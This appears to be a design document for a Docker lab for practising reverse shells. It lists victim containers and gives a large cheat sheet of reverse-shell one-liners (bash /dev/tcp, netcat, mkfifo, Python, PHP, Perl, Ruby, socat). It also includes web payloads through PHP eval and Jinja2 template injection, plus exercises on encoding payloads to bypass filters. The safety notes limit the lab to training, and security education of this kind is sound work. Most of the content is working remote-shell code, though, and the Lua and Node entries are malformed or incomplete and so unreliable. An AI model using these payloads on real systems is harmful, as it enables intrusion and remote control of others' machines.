# Reverse Shell Playground - Manual Practice Environment

## Overview
Educational environment for manually creating and testing reverse shells against various victim system configurations.

**Goal:** Practice hand-crafting reverse shells for as many different environments as possible.

---

## 1. Victim Container Types

Each container represents a different real-world victim scenario.

| Container | Description | Tools Available |
|-----------|-------------|-----------------|
| **busybox** | Minimal embedded device | Busybox only (no bash, no nc) |
| **alpine-bash** | Minimal + bash | bash, busybox |
| **debian-minimal** | Basic Linux | sh, bash |
| **debian-full** | Standard server | bash, nc, python, perl |
| **ubuntu-python** | Python dev box | python2, python3, bash |
| **php-apache** | Web server | php, bash, nc |
| **php-cli** | PHP CLI environment | php only |
| **ruby-host** | Ruby app server | ruby, bash, nc |
| **node-host** | Node.js app | node, npm, bash |
| **java-host** | Java application | java, bash |
| **mixed-tools** | Everything available | All above combined |

---

## 2. Reverse Shell Techniques Matrix

### A. Direct Shell Redirection
| Technique | Victim Requirement | Command |
|-----------|-------------------|---------|
| Bash /dev/tcp | Bash built-in | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Sh + nc | Netcat traditional | `nc -e /bin/sh IP PORT` |
| Sh + nc (OpenBSD) | Netcat with -c | `nc -c /bin/sh IP PORT` |
| Sh + nc (pipe) | Netcat (no -e/-c) | `nc IP PORT \| /bin/sh 2>&1 \| nc IP PORT` |
| Mkfifo | Any POSIX shell | `mkfifo /tmp/p; nc IP PORT 0</tmp/p \| /bin/sh > /tmp/p` |

### B. Scripting Language One-Liners
| Language | Victim Requirement | One-Liner |
|----------|-------------------|-----------|
| Python 2 | python2 | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);s.close()'` |
| Python 3 | python3 | (same as above, adjust syntax) |
| PHP | php-cli | `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| Perl | perl | `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| Ruby | ruby | `ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |
| Node.js | node | `require('child_process').spawn('sh',[],{stdio:[0,1,2]}).on('exit',x=>0)` (wrapped in socket) |
| Lua | lua | `lua -e "require('socket').connect('IP',PORT):write('string.dump(function()os.execute('/bin/sh')end))"` |

### C. Interactive TTY Spawning
| After shell, run... | Purpose |
|---------------------|---------|
| `python -c 'import pty;pty.spawn("/bin/bash")'` | Full TTY |
| `script /dev/null` | Quick TTY fallback |
| `socat exec:'bash',pty,stderr,setsid,sigint,sane tcp:IP:PORT` | Clean TTY via socat |
| `stty raw -echo; fg` | Fix terminal after Ctrl+Z |

### D. When Tools Are Missing / Limited
| Scenario | Technique |
|----------|-----------|
| **No nc, no bash** | Use `/bin/sh` with redirection if available |
| **Busybox only** | Use busybox nc, or telnet if present |
| **No /dev/tcp** | Use Python/Perl if available, or nc |
| **Read-only filesystem** | Memory-only shells, no file writes |
| **No exec() allowed** | Deserialization attacks, template injection |

### E. Web Application Vectors (Command Execution)
| Vector | Payload Pattern |
|--------|-----------------|
| PHP eval() | `?cmd=system('bash -i >& /dev/tcp/IP/PORT 0>&1');` |
| Python exec() | `?code=exec%28%22import%20socket%2Csubprocess%2Cos%3Bs%3D...%22%29` |
| Java Runtime.exec() | Deserialization payload → bash -c '...' |
| Template Injection (Jinja2) | `{{config.__class__.__init__.__globals__['os'].popen('bash -i ...').read()}}` |

---

## 3. Docker Infrastructure

### Directory Structure
```
drakonix-reverse-shell-playground/
├── docker-compose.yml
├── .env
├── victims/
│   ├── Dockerfile.busybox
│   ├── Dockerfile.alpine-bash
│   ├── Dockerfile.debian-minimal
│   ├── Dockerfile.debian-full
│   ├── Dockerfile.ubuntu-python
│   ├── Dockerfile.php-apache
│   ├── Dockerfile.php-cli
│   ├── Dockerfile.ruby-host
│   ├── Dockerfile.node-host
│   ├── Dockerfile.java-host
│   └── Dockerfile.mixed-tools
├── scripts/
│   ├── listeners.sh          # Start all listeners at once
│   └── payload-cheatsheet.md # Quick reference
└── README.md
```

### Docker Compose Services
```yaml
services:
  attacker:
    image: kalilinux/kali-rolling
    network_mode: host  # Can reach all victims

  victim-busybox:
    build: ./victims --file Dockerfile.busybox

  victim-alpine-bash:
    build: ./victims --file Dockerfile.alpine-bash

  victim-debian-minimal:
    build: ./victims --file Dockerfile.debian-minimal

  # ... etc
```

### Victim Port Exposure
All victims expose nothing by default. Attacker connects via Docker internal network.

---

## 4. Victim Dockerfiles (Examples)

### busybox
```dockerfile
FROM busybox:latest
CMD ["sh"]
```

### php-cli
```dockerfile
FROM php:8-cli
# No shell escape helpers, practice pure PHP reverse shells
CMD ["php", "-a"]
```

### ubuntu-python
```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3 python2
# No netcat - force Python shells
CMD ["bash"]
```

---

## 5. Usage Workflow

```bash
# Start all victims
docker-compose up -d

# Enter attacker box
docker-compose exec attacker bash

# List available victims
docker ps

# Connect to a victim
docker exec -it drakonix-reverse-shell-playground-victim-busybox-1 sh

# On victim: try reverse shell techniques
# On attacker: start listeners on ports 4444, 5555, 6666, etc.

nc -lvnp 4444  # Listener 1
nc -lvnp 5555  # Listener 2
python -c '...' # Start Python listener
```

---

## 6. Learning Exercises

1. **Busybox Challenge**: No bash, no /dev/tcp, no nc -e. How?
2. **PHP-Only Challenge**: Only php-cli, no bash at all.
3. **No Direct Exec**: Use deserialization or template injection.
4. **Encoded Payloads**: Base64, URL encode, hex encode to bypass filters.
5. **Chained Commands**: When direct connection blocked, use multiple hops.
6. **Port Knocking**: Reverse shell only after specific port sequence.

---

## 7. Cheatsheet Structure

For each victim type, document:
- What's available
- Working one-liner
- Fallback options
- Common gotchas

```
VICTIM: busybox
─────────────────────────────────────
Tools: sh, busybox nc (no -e)
Working: mkfifo /tmp/p; busybox nc IP PORT 0</tmp/p | sh > /tmp/p
Fallback: busybox telnet IP PORT | sh
Gotcha: No /dev/tcp in sh
```

---

## 8. Safety Notes

- ✅ For: CTF practice, pentest training, security education
- ✅ Isolated: Docker networks only
- ⚠️ Warning: Never expose to public internet
- ❌ Not for: Unauthorized system access
